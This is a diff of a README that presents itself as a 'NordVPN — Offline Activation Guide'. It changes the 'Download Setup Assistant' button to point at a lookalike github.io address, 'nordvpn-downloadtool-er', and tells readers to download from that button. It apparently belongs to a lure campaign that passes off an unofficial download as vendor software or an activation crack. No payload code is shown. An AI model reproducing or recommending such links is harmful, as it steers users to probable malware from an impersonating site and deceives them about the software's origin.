@@ -1,6 +1,6 @@
 # NordVPN — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://nordvpn-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://nordvpn-downloadtool-er.github.io/.github/)
 
 ## ⚙️ How to Use
 1. Download the setup assistant using the button above  
